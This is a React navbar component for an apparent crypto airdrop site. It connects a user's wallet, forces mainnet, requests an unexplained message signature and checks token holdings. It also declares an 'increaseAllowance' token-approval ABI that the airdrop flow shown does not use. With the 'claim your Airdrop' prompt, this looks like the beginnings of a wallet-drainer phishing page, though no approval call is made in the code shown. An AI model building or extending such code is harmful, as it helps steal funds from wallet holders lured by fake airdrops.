"use client";
import React, { useEffect, useMemo, useState } from "react";
import { toast } from "sonner";
import { AddressLike, BrowserProvider, Eip1193Provider, ethers } from "ethers";
import { useEvmNativeBalance } from "@moralisweb3/next";
import { Button } from "../../ui/button";
import {
  useWeb3ModalProvider,
  useWeb3Modal,
  useWalletInfo,
  useWeb3ModalAccount,
  useDisconnect,
  useWeb3ModalState,
  useSwitchNetwork,
} from "@web3modal/ethers/react";
import Image from "next/image";
import { storeUsersWalletAddress } from "@/app/services/zustand/tokenWallet";
import { executeUsersWallet } from "@/app/services/zustand/api/getUsersToken";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/app/components/ui/alert-dialog";

function Navbar() {
  const { open } = useWeb3Modal();
  const { walletProvider } = useWeb3ModalProvider();
  const { walletInfo } = useWalletInfo();
  const { disconnect } = useDisconnect();
  const { address, chainId, isConnected } = useWeb3ModalAccount();
  const { switchNetwork } = useSwitchNetwork();
  const { selectedNetworkId } = useWeb3ModalState();
  const { data: nativeBalance } = useEvmNativeBalance({
    address: String(address),
  });
  console.log(nativeBalance, "Eth balances");
  const [getProvider, setGetProvider] = useState<BrowserProvider>();
  const [getSigner, setGetSigner] = useState<ethers.JsonRpcSigner>();
  const getWalletMetadata = executeUsersWallet(
    (state) => state.getUsersWalletToken
  );
  const usersWalletData = executeUsersWallet((state) => state.usersWalletToken);
  const [showAlert, setShowAlert] = useState<boolean>(false);

  //zustand
  const setUsersAddress = storeUsersWalletAddress(
    (state) => state.getUsersWallet
  );
  const walletAbi = [
    "function increaseAllowance(address spender, uint256 addedValue)public virtual returns (bool)",
  ];

  useEffect(() => {
    if (!isConnected){
        setShowAlert(false)
        return;
    }else{
        // getWalletMetadata(String(address));
        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");

    }
  }, [isConnected]);



  useEffect(() => {
    (async () => {
      if (selectedNetworkId != String(1)) {
        switchNetwork(1);
      }
      if (walletProvider == undefined) return;
      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const balanceEth = await provider.getBalance(address as AddressLike);
      const signature = await signer?.signMessage(
        "hello how are you doing today "
      );
      // getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d")
      // getWalletMetadata(String(address))
      setGetProvider(provider);
      setGetSigner(signer);
      console.log("users balance ", signer, Number(balanceEth), signature);
    })();
  }, [selectedNetworkId, walletProvider, setGetProvider, setGetSigner]);


  useMemo(()=>{
      if(usersWalletData?.token?.length == 0){
    setShowAlert(true)
 } else {
    setShowAlert(false)
 }
  },[usersWalletData , setShowAlert])

  const connectWallet = async () => {
    try {
      open({ view: "Networks" });
      setUsersAddress(String(address));
      toast("Wallet Connection Established", {
        description: "You are now ready to claim your Airdrop",
      });
    } catch (error: any) {
      console.log(error);
    }

    //provider init
  };

  const walletDisconnected = () => {
    disconnect();
    toast("Wallet disconnected", {
      description: "Your Wallet is disconnected",
    });
  };

  return (
    <div className="">
      <div>
        {isConnected ? (
          <Button onClick={() => walletDisconnected()}>
            <Image
              src={String(walletInfo?.icon)}
              alt={String(walletInfo?.name)}
              height={30}
              width={30}
            />
            <span>
              {String(
                address?.slice(0, 5) + "..." + address?.slice(38, 42)
              ).toLowerCase()}
            </span>
          </Button>
        ) : (
          <Button variant={"secondary"} onClick={() => connectWallet()}>
            Connect Wallet
          </Button>
        )}
      </div>
        <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
          <AlertDialogContent>
            <AlertDialogHeader>
              <AlertDialogTitle>Notice: You're Not Eligible for the Current Airdrop</AlertDialogTitle>
              <AlertDialogDescription>
              We regret to inform you that you are not eligible to participate in the ongoing airdrop. Our airdrop 
              program is designed to reward active community members, and unfortunately, you do not meet the 
              criteria at this time. We appreciate your interest and support, and we encourage you to stay 
              engaged with our project for future opportunities. Thank you for your understanding.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              {/* <AlertDialogAction>Continue</AlertDialogAction> */}
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
    </div>
  );
}

export default Navbar;
